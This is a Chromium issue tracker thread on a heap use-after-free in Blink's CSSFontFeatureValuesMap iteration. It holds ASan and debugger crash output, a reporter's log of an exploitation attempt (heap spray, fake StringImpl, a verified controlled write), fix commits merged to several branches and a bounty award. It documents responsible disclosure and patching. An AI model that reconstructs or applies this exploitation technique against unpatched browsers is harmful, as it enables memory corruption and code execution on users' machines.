    Cr-Commit-Position: refs/heads/main@{#1583927}

```

---

Files:

- M `third_party/blink/renderer/core/css/css_font_feature_values_map.cc`
- A `third_party/blink/web_tests/external/wpt/css/css-fonts/font_feature_values_map_iteration.html`

---

Hash: [e045399a1ecb7ee16e1a7bcbcd8ea59d283dfb07](https://chromiumdash.appspot.com/commit/e045399a1ecb7ee16e1a7bcbcd8ea59d283dfb07)  

Date: Thu Feb 12 14:35:36 2026


---

### fa...@gmail.com (2026-02-12)

Same proof of concept crashes the main thread T0 on macOS.

Run: `./Chromium.app/Contents/MacOS/Chromium poc.html`

```
=================================================================
==4325==ERROR: AddressSanitizer: heap-use-after-free on address 0x6110000b7ee0 at pc 0x0003659385dc bp 0x00016f5ab870 sp 0x00016f5ab868
READ of size 8 at 0x6110000b7ee0 thread T0
==4325==WARNING: invalid path to external symbolizer!
==4325==WARNING: Failed to use and restart external symbolizer!
    #0 0x0003659385d8 in blink::FontFeatureValuesMapIterationSource::FetchNextItem(blink::ScriptState*, blink::String&, blink::Vector<unsigned int, 0u, blink::PartitionAllocator>&)+0x394 (/Users/admin/Desktop/chrome-fuzzer/chrome/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/146.0.7679.0/Chromium Framework:arm64+0x1c4e05d8)
    #1 0x00036997aebc in blink::bindings::PairSyncIterationSource<blink::IDLStringBase<(blink::bindings::IDLStringConvMode)0>, blink::IDLSequence<blink::IDLIntegerTypeBase<unsigned int, (blink::bindings::IDLIntegerConvMode)0>>, blink::String, blink::Vector<unsigned int, 0u, blink::PartitionAllocator>>::ForEach(blink::ScriptState*, blink::ScriptValue const&, blink::V8ForEachIteratorCallback*, blink::ScriptValue const&, blink::ExceptionState&)+0x218 (/Users/admin/Desktop/chrome-fuzzer/chrome/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/146.0.7679.0/Chromium Framework:arm64+0x20522ebc)
    #2 0x000369978f80 in blink::(anonymous namespace)::v8_css_font_feature_values_map::ForEachOperationCallback(v8::FunctionCallbackInfo<v8::Value> const&)+0x3e0 (/Users/admin/Desktop/chrome-fuzzer/chrome/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/146.0.7679.0/Chromium Framework:arm64+0x20520f80)
    #3 0x0003f7e103b4  (<unknown module>)
    #4 0x0003f7e0e2fc  (<unknown module>)
    #5 0x0003f7e0b300  (<unknown module>)
    #6 0x0003f7e0aff8  (<unknown module>)
    ...
    #29 0x00035575d290 in blink::NavigationBodyLoader::ReadFromDataPipe()+0x190 (/Users/admin/Desktop/chrome-fuzzer/chrome/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/146.0.7679.0/Chromium Framework:arm64+0xc305290)

SUMMARY: AddressSanitizer: heap-use-after-free (/Users/admin/Desktop/chrome-fuzzer/chrome/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/146.0.7679.0/Chromium Framework:arm64+0x1c4e05d8) in blink::FontFeatureValuesMapIterationSource::FetchNextItem(blink::ScriptState*, blink::String&, blink::Vector<unsigned int, 0u, blink::PartitionAllocator>&)+0x394
Shadow bytes around the buggy address:
  0x6110000b7c00: fa fa fa fa fa fa f7 fa fd fd fd fd fd fd fd fd
  0x6110000b7c80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x6110000b7d00: fd fd fd fd fd fd fd fd fa fa fa fa fa fa f7 fa
  0x6110000b7d80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x6110000b7e00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x6110000b7e80: fa fa fa fa fa fa f7 fa fd fd fd fd[fd]fd fd fd
  0x6110000b7f00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x6110000b7f80: fd fd fd fd fd fd fd fd fa fa fa fa fa fa f7 fa
  0x6110000b8000: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x6110000b8080: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x6110000b8100: fa fa fa fa fa fa f7 fa fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==4325==ADDITIONAL INFO

==4325==Note: Please include this section with the ASan report.
Task trace:
    #0 0x00035e78774c in IPC::ChannelAssociatedGroupController::Accept(mojo::Message*)+0x7c4 (/Users/admin/Desktop/chrome-fuzzer/chrome/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/146.0.7679.0/Chromium Framework:arm64+0x1532f74c)


Command line: `/Users/admin/Desktop/chrome-fuzzer/chrome/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/146.0.7679.0/Helpers/Chromium Helper (Renderer).app/Contents/MacOS/Chromium Helper (Renderer) --type=renderer --user-data-dir=/var/folders/cf/5ykypmzj7_35mhngh_rr8bcm0000gn/T/tmp3gsvnxxrd --start-stack-profiler --file-url-path-alias=/gen=/Users/admin/Desktop/chrome-fuzzer/chrome/gen --lang=en-US --num-raster-threads=4 --enable-zero-copy --enable-gpu-memory-buffer-compositor-resources --enable-main-frame-before-activation --renderer-client-id=6 --time-ticks-at-unix-epoch=-1770881651822302 --launch-time-ticks=32191710602 --shared-files --metrics-shmem-handle=1752395122,r,17419531869734371350,6985357387545815537,2097152 --field-trial-handle=1718379636,r,1120742475463415545,4843546147279747304,262144 --variations-seed-version --pseudonymization-salt-handle=1935764596,r,5590497593066378203,9080102503309176957,4 --trace-process-track-uuid=3190708991934122588 --seatbelt-client=73`


MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==4325==END OF ADDITIONAL INFO

==4325==ABORTING


```

### dx...@google.com (2026-02-12)

Project: chromium/src  

Branch:  refs/branch-heads/7684  

Author:  Dominik Röttsches [drott@chromium.org](mailto:drott@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7572284>

Avoid stale iteration in CSSFontFeatureValuesMap

---


Expand for full commit details
```
     
    To avoid invalid iterator state, take a snapshot of the 
    map when creating the iteration source. This addresses 
    the immediate problem of iterating while modifying. 
     
    Remaining work tracked in https://crbug.com/483936078 
     
    (cherry picked from commit e045399a1ecb7ee16e1a7bcbcd8ea59d283dfb07) 
     
    Fixed: 483569511 
    Change-Id: Ie29cfdf7ed94bbe189b44c842a5efce571bb2cee 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7566570 
    Commit-Queue: Dominik Röttsches <drott@chromium.org> 
    Reviewed-by: Anders Hartvoll Ruud <andruud@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1583927} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7572284 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Owners-Override: Srinivas Sista <srinivassista@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/7684@{#4} 
    Cr-Branched-From: ac49204ca8c06008bc4b9af33ede7fa525ed98a1-refs/heads/main@{#1583842}

```

---

Files:

- M `third_party/blink/renderer/core/css/css_font_feature_values_map.cc`
- A `third_party/blink/web_tests/external/wpt/css/css-fonts/font_feature_values_map_iteration.html`

---

Hash: [6abdb80fb7736fd2be8fdd0b6c901d204f8992d2](https://chromiumdash.appspot.com/commit/6abdb80fb7736fd2be8fdd0b6c901d204f8992d2)  

Date: Thu Feb 12 16:48:02 2026


---

### dr...@chromium.org (2026-02-12)

We'll want to merge this to M144 and M145. Based on the urgency here and the low complexity of the fix, approving directly.

### dx...@google.com (2026-02-12)

Project: chromium/src  

Branch:  refs/branch-heads/7632\_45  

Author:  Dominik Röttsches [drott@chromium.org](mailto:drott@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7572291>

Avoid stale iteration in CSSFontFeatureValuesMap

---


Expand for full commit details
```
     
    To avoid invalid iterator state, take a snapshot of the 
    map when creating the iteration source. This addresses 
    the immediate problem of iterating while modifying. 
     
    Remaining work tracked in https://crbug.com/483936078 
     
    (cherry picked from commit e045399a1ecb7ee16e1a7bcbcd8ea59d283dfb07) 
     
    Fixed: 483569511 
    Change-Id: Ie29cfdf7ed94bbe189b44c842a5efce571bb2cee 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7566570 
    Commit-Queue: Dominik Röttsches <drott@chromium.org> 
    Reviewed-by: Anders Hartvoll Ruud <andruud@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1583927} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7572291 
    Owners-Override: Srinivas Sista <srinivassista@chromium.org> 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Cr-Commit-Position: refs/branch-heads/7632_45@{#8} 
    Cr-Branched-From: 7ad2aeb6be38786b2bf653d667d3df01e68d3c40-refs/branch-heads/7632@{#1825} 
    Cr-Branched-From: 0bbdf2913883391365383b0a5dfe7bf9fd1a5213-refs/heads/main@{#1568190}

```

---

Files:

- M `third_party/blink/renderer/core/css/css_font_feature_values_map.cc`
- A `third_party/blink/web_tests/external/wpt/css/css-fonts/font_feature_values_map_iteration.html`

---

Hash: [63f3cb4864c64c677cd60c76c8cb49d37d08319c](https://chromiumdash.appspot.com/commit/63f3cb4864c64c677cd60c76c8cb49d37d08319c)  

Date: Thu Feb 12 19:01:46 2026


---

### dx...@google.com (2026-02-12)

Project: chromium/src  

Branch:  refs/branch-heads/7559\_173  

Author:  Dominik Röttsches [drott@chromium.org](mailto:drott@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7571701>

Avoid stale iteration in CSSFontFeatureValuesMap

---


Expand for full commit details
```
     
    To avoid invalid iterator state, take a snapshot of the 
    map when creating the iteration source. This addresses 
    the immediate problem of iterating while modifying. 
     
    Remaining work tracked in https://crbug.com/483936078 
     
    (cherry picked from commit e045399a1ecb7ee16e1a7bcbcd8ea59d283dfb07) 
     
    (cherry picked from commit 63f3cb4864c64c677cd60c76c8cb49d37d08319c) 
     
    Fixed: 483569511 
    Change-Id: Ie29cfdf7ed94bbe189b44c842a5efce571bb2cee 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7566570 
    Commit-Queue: Dominik Röttsches <drott@chromium.org> 
    Reviewed-by: Anders Hartvoll Ruud <andruud@chromium.org> 
    Cr-Original-Original-Commit-Position: refs/heads/main@{#1583927} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7572291 
    Owners-Override: Srinivas Sista <srinivassista@chromium.org> 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Cr-Original-Commit-Position: refs/branch-heads/7632_45@{#8} 
    Cr-Original-Branched-From: 7ad2aeb6be38786b2bf653d667d3df01e68d3c40-refs/branch-heads/7632@{#1825} 
    Cr-Original-Branched-From: 0bbdf2913883391365383b0a5dfe7bf9fd1a5213-refs/heads/main@{#1568190} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7571701 
    Cr-Commit-Position: refs/branch-heads/7559_173@{#3} 
    Cr-Branched-From: 4f3019d9775ef7c4b29cfea41095d8a0155c6eed-refs/branch-heads/7559@{#4633} 
    Cr-Branched-From: 223dfbac1c7542a06b422390d954afe5b560b607-refs/heads/main@{#1552494}

```

---

Files:

- M `third_party/blink/renderer/core/css/css_font_feature_values_map.cc`
- A `third_party/blink/web_tests/external/wpt/css/css-fonts/font_feature_values_map_iteration.html`

---

Hash: [361e746a950e34aada7850965ab5470bbdcd0b67](https://chromiumdash.appspot.com/commit/361e746a950e34aada7850965ab5470bbdcd0b67)  

Date: Thu Feb 12 19:05:56 2026


---

### dx...@google.com (2026-02-12)

Project: chromium/src  

Branch:  refs/branch-heads/7632  

Author:  Dominik Röttsches [drott@chromium.org](mailto:drott@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7571312>

Avoid stale iteration in CSSFontFeatureValuesMap

---


Expand for full commit details
```
     
    To avoid invalid iterator state, take a snapshot of the 
    map when creating the iteration source. This addresses 
    the immediate problem of iterating while modifying. 
     
    Remaining work tracked in https://crbug.com/483936078 
     
    (cherry picked from commit e045399a1ecb7ee16e1a7bcbcd8ea59d283dfb07) 
     
    Fixed: 483569511 
    Change-Id: Ie29cfdf7ed94bbe189b44c842a5efce571bb2cee 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7566570 
    Commit-Queue: Dominik Röttsches <drott@chromium.org> 
    Reviewed-by: Anders Hartvoll Ruud <andruud@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1583927} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7571312 
    Commit-Queue: Srinivas Sista <srinivassista@chromium.org> 
    Owners-Override: Srinivas Sista <srinivassista@chromium.org> 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Cr-Commit-Position: refs/branch-heads/7632@{#2548} 
    Cr-Branched-From: 0bbdf2913883391365383b0a5dfe7bf9fd1a5213-refs/heads/main@{#1568190}

```

---

Files:

- M `third_party/blink/renderer/core/css/css_font_feature_values_map.cc`
- A `third_party/blink/web_tests/external/wpt/css/css-fonts/font_feature_values_map_iteration.html`

---

Hash: [bdc68bc59aa7910875d5204ccbcdcd3111c9c075](https://chromiumdash.appspot.com/commit/bdc68bc59aa7910875d5204ccbcdcd3111c9c075)  

Date: Thu Feb 12 21:13:10 2026


---

### dx...@google.com (2026-02-12)

Project: chromium/src  

Branch:  refs/branch-heads/7559  

Author:  Dominik Röttsches [drott@chromium.org](mailto:drott@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7571699>

Avoid stale iteration in CSSFontFeatureValuesMap

---


Expand for full commit details
```
     
    To avoid invalid iterator state, take a snapshot of the 
    map when creating the iteration source. This addresses 
    the immediate problem of iterating while modifying. 
     
    Remaining work tracked in https://crbug.com/483936078 
     
    (cherry picked from commit e045399a1ecb7ee16e1a7bcbcd8ea59d283dfb07) 
     
    Fixed: 483569511 
    Change-Id: Ie29cfdf7ed94bbe189b44c842a5efce571bb2cee 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7566570 
    Commit-Queue: Dominik Röttsches <drott@chromium.org> 
    Reviewed-by: Anders Hartvoll Ruud <andruud@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1583927} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7571699 
    Owners-Override: Srinivas Sista <srinivassista@chromium.org> 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Commit-Queue: Srinivas Sista <srinivassista@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/7559@{#4695} 
    Cr-Branched-From: 223dfbac1c7542a06b422390d954afe5b560b607-refs/heads/main@{#1552494}

```

---

Files:

- M `third_party/blink/renderer/core/css/css_font_feature_values_map.cc`
- A `third_party/blink/web_tests/external/wpt/css/css-fonts/font_feature_values_map_iteration.html`

---

Hash: [588ef58433f0f175d02e90d1dff154f1720df010](https://chromiumdash.appspot.com/commit/588ef58433f0f175d02e90d1dff154f1720df010)  

Date: Thu Feb 12 21:14:13 2026


---

### sr...@chromium.org (2026-02-12)

Adding 146 merge approval as well

### dx...@google.com (2026-02-13)

Project: chromium/src  

Branch:  refs/branch-heads/7680  

Author:  Dominik Röttsches [drott@chromium.org](mailto:drott@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7571077>

Avoid stale iteration in CSSFontFeatureValuesMap

---


Expand for full commit details
```
     
    To avoid invalid iterator state, take a snapshot of the 
    map when creating the iteration source. This addresses 
    the immediate problem of iterating while modifying. 
     
    Remaining work tracked in https://crbug.com/483936078 
     
    (cherry picked from commit e045399a1ecb7ee16e1a7bcbcd8ea59d283dfb07) 
     
    Fixed: 483569511 
    Change-Id: Ie29cfdf7ed94bbe189b44c842a5efce571bb2cee 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7566570 
    Commit-Queue: Dominik Röttsches <drott@chromium.org> 
    Reviewed-by: Anders Hartvoll Ruud <andruud@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1583927} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7571077 
    Owners-Override: Srinivas Sista <srinivassista@chromium.org> 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Cr-Commit-Position: refs/branch-heads/7680@{#193} 
    Cr-Branched-From: 76b7d80e5cda23fe6537eed26d68c92e995c7f39-refs/heads/main@{#1582197}

```

---

Files:

- M `third_party/blink/renderer/core/css/css_font_feature_values_map.cc`
- A `third_party/blink/web_tests/external/wpt/css/css-fonts/font_feature_values_map_iteration.html`

---

Hash: [a6118772815e5b939798f53da1f9d5b8b33ce049](https://chromiumdash.appspot.com/commit/a6118772815e5b939798f53da1f9d5b8b33ce049)  

Date: Fri Feb 13 08:10:04 2026


---

### dr...@chromium.org (2026-02-13)

> Adding 146 merge approval as well

Fix for M146, branch 7680 landed as well, in #15.

### fa...@gmail.com (2026-02-15)

### Proof-of-Concept - Controlled Dereference / Object Hijack:

Debug (Pattern: 0x41414141):

```
Microsoft (R) Windows Debugger Version 10.0.29507.1001 AMD64
Copyright (c) Microsoft Corporation. All rights reserved.

CommandLine: "D:\browser\chromium\src\out\Release\chrome.exe"  --user-data-dir="C:/Users/Admin/AppData/Local/Temp/CHROME-4568-3628" "file:///D:/browser/uaf/poc.html"

...

(9d18.a37c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for D:\browser\chromium\src\out\Release\chrome.dll
chrome!std::__Cr::__cxx_atomic_load [inlined in chrome!blink::String::operator=+0x2a]:
00007ff9`3dfb8a6a 8b4808          mov     ecx,dword ptr [rax+8] ds:41414141`41414149=????????
6:113> r; db @rdx L40
rax=4141414141414141 rbx=000069a400490070 rcx=000000f8e3dfa0c0
rdx=0000595400229a60 rsi=000000f8e3dfa0c0 rdi=000000f8e3dfa0b0
rip=00007ff93dfb8a6a rsp=000000f8e3df9fb0 rbp=000000f8e3dfa110
 r8=000000f8e3dfa0c0  r9=000000f8e3dfa0b0 r10=00000fff28daf52a
r11=0000040000000000 r12=0000595400138250 r13=000000f8e3dfa0a0
r14=000000f8e3dfa118 r15=000000f8e3dfa0a0
iopl=0         nv up ei pl nz na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
chrome!std::__Cr::__cxx_atomic_load [inlined in chrome!blink::String::operator=+0x2a]:
00007ff9`3dfb8a6a 8b4808          mov     ecx,dword ptr [rax+8] ds:41414141`41414149=????????
00005954`00229a60  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00005954`00229a70  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00005954`00229a80  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00005954`00229a90  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

```

Build (Release/args.gn):

```
is_debug = false
is_component_build = false
symbol_level = 1

```

### fa...@gmail.com (2026-02-16)

### Proof-of-Concept - Controlled Write:

Apply similar V8 patch from [Issue 446722008](https://issues.chromium.org/issues/446722008#comment30) (only the V8 patch) to the above release build and rebuild.

Run: `chrome.exe --user-data-dir=test poc-write.html`

```
CONTROLLED WRITE VERIFIED
[+] chrome.dll base: 0x7ff989ba0000
[+] Found writable section at base+0x10958000 size=0x36ac00
[+] Scratch address: 0x7ff99a4f9000
[+] Fake StringImpl at 0x7ff99a4f9000
[+] ref_count = 0xdead0000 (should be 0xDEAD0000)
[+] hash_and_flags = 0x0 (kIsStatic=0 → lock inc WILL fire)
[*] Spray target: StringImpl* = 0x7ff99a4f9000 (kIsStatic=0)
[+] Created 500 spray rules
[*] Starting forEach → UAF...
[*] Callback #0: rehashing...
[*] Spraying fake StringImpl* (kIsStatic=0)...
[+] Spray done. Returning → lock inc should fire...
======= CONTROLLED WRITE VERIFICATION =======
Address: 0x7ff99a4f9000
BEFORE: 0xdead0000 (written by POCHelper)
AFTER: 0xdead0001 (read back after UAF)
RESULT: 0xDEAD0000 → 0xDEAD0001 ★ WRITE CONFIRMED ★
METHOD: lock inc dword ptr [rax] via UAF code path
=============================================
[!!!] UAF CALLBACK #1 survived (kIsStatic=0 path!)
[!!!] UAF CALLBACK #2 survived (kIsStatic=0 path!)
[!!!] UAF CALLBACK #3 survived (kIsStatic=0 path!)
[+] Clean exit after 3 UAF callbacks
═══════════════════════════════════════════════
UAF → lock inc dword ptr [rax] → WRITE PROVEN
0xDEAD0000 incremented to 0xDEAD0001 at controlled address
═══════════════════════════════════════════════

```

### dr...@chromium.org (2026-02-16)

Re #17, which version are you refering to on this one? Patched or unpatched?

### fa...@gmail.com (2026-02-16)

Unpatched.

### ch...@google.com (2026-02-16)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### pe...@google.com (2026-02-19)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-02-19)

1. <https://chromium-review.googlesource.com/c/chromium/src/+/7591633>
2. Low, there were few conflicts
3. 144, 145, and 146
4. Yes, M138 also has the issue caused by `aliases_` map being modified directly.

### dx...@google.com (2026-02-23)

Project: chromium/src  

Branch:  refs/branch-heads/7204  

Author:  Dominik Röttsches [drott@chromium.org](mailto:drott@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7591633>

[M138-LTS] Avoid stale iteration in CSSFontFeatureValuesMap

---


Expand for full commit details
```
     
    To avoid invalid iterator state, take a snapshot of the 
    map when creating the iteration source. This addresses 
    the immediate problem of iterating while modifying. 
     
    Remaining work tracked in https://crbug.com/483936078 
     
    (cherry picked from commit e045399a1ecb7ee16e1a7bcbcd8ea59d283dfb07) 
     
    Fixed: 483569511 
    Change-Id: Ie29cfdf7ed94bbe189b44c842a5efce571bb2cee 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7566570 
    Commit-Queue: Dominik Röttsches <drott@chromium.org> 
    Reviewed-by: Anders Hartvoll Ruud <andruud@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1583927} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7591633 
    Reviewed-by: Michael Ershov <miersh@google.com> 
    Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
    Reviewed-by: Dominik Röttsches <drott@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/7204@{#3488} 
    Cr-Branched-From: d5de512dc9dc8ddfe4e6d71b0637578bb6158683-refs/heads/main@{#1465706}

```

---

Files:

- M `third_party/blink/renderer/core/css/css_font_feature_values_map.cc`
- A `third_party/blink/web_tests/external/wpt/css/css-fonts/font_feature_values_map_iteration.html`

---

Hash: [185ca964d3e1ab5e67f64ff73b369c385b937a53](https://chromiumdash.appspot.com/commit/185ca964d3e1ab5e67f64ff73b369c385b937a53)  

Date: Mon Feb 23 03:30:21 2026


---

### dx...@google.com (2026-02-25)

Project: chromium/src  

Branch:  main  

Author:  Dominik Röttsches [drott@chromium.org](mailto:drott@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7607381>

Remove const in FontFeatureValuesMap iteration source

---


Expand for full commit details
```
     
    Const defeats the std::move() for a constructor argument. Remove const 
    to avoid the copy. 
     
    Follow-up to https://crrev.com/c/7566570/. 
     
    Bug: 483569511 
    Change-Id: I7c0031d5435734536936f5281971fe9a65ce76e2 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7607381 
    Commit-Queue: Peter Kasting <pkasting@chromium.org> 
    Auto-Submit: Dominik Röttsches <drott@chromium.org> 
    Reviewed-by: Peter Kasting <pkasting@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1590169}

```

---

Files:

- M `third_party/blink/renderer/core/css/css_font_feature_values_map.cc`

---

Hash: [6762cc0b47a781a2ac14c347767da53bbd062bf5](https://chromiumdash.appspot.com/commit/6762cc0b47a781a2ac14c347767da53bbd062bf5)  

Date: Wed Feb 25 15:38:06 2026


---

### sp...@google.com (2026-03-05)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $50000.00 for this report.

Rationale for this decision:
High Quality with Functional Exploit. Renderer RCE / memory corruption in a sandboxed process


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### qk...@google.com (2026-04-12)

Labeled `LTS-Merge-Merged-144` because the patch was already merged to M144.

### ch...@google.com (2026-05-22)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> High Quality with Functional Exploit. Renderer RCE / memory corruption in a sandboxed process

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/483569511)*
